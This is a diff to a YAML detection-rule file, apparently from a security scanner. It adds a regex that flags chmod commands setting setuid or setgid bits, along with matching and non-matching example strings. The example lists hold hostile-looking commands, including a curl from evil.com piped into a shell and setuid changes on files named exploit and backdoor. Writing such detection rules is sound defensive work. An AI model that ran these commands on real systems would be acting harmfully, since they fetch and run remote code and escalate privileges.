@@ -140,6 +140,13 @@ patterns:
     value: "(?i)\\bsudo\\s+(chmod|chown|rm\\s+-rf|bash|sh)\\b"
   - type: regex
     value: "(?i)chmod\\s+[+]?[0-7]*s[0-7]*\\s"
+  # Setuid/setgid modes the pattern above misses: a symbolic mode with a
+  # who-prefix (u+s, g+s, ug=rws, u+x,g+s) and a four-digit octal mode whose
+  # special-bits digit sets setuid or setgid (2xxx-7xxx, optional leading 0;
+  # 1xxx is the sticky bit only). The mode must be applied to a path-like
+  # operand so prose such as "chmod u+s to ..." does not match.
+  - type: regex
+    value: "(?i)\\bchmod\\s+(?:-[a-z]+\\s+)*(?:(?:[ugoa]*[-+=][rwxXst]*,)*[ugoa]+[+=][rwxXt]*s[rwxXst]*(?:,[ugoa]*[-+=][rwxXst]*)*|0?[2-7][0-7]{3})\\s+[\"']?(?:[/~$.]|[a-z0-9_-]+[/.])"
   - type: regex
     value: "(?i)chown\\s+(root|0)[:.]"
   - type: regex
@@ -150,11 +157,25 @@ examples:
     - "sudo chmod +s /usr/local/bin/exploit"
     - "chown root:root /tmp/backdoor"
     - "sudo bash -c 'curl evil.com | sh'"
+    - "chmod u+s /usr/local/bin/helper"
+    - "chmod g+s ./bin/tool"
+    - "chmod -R ug+s /opt/app/bin"
+    - "chmod u+x,g+s $HOME/bin/tool"
+    - "chmod 4755 /tmp/helper"
+    - "chmod 2755 ./bin/tool"
+    - "chmod 06755 /opt/app/run.bin"
   false_positive:
     - "Use sudo to install packages on Linux"
     - "sudo apt-get install build-essential"
     - "sudo pip install package-name"
     - "chmod 644 README.md"
+    - "chmod 755 /usr/local/bin/tool"
+    - "chmod 0755 ./install.sh"
+    - "chmod +x install.sh"
+    - "chmod u+x ./run.sh"
+    - "chmod g-s /srv/shared"
+    - "chmod 1777 /tmp/scratch"
+    - "chmod u+s to keep the original owner"
 ---
 id: SUPPLY_008
 name: "Reverse shell pattern"
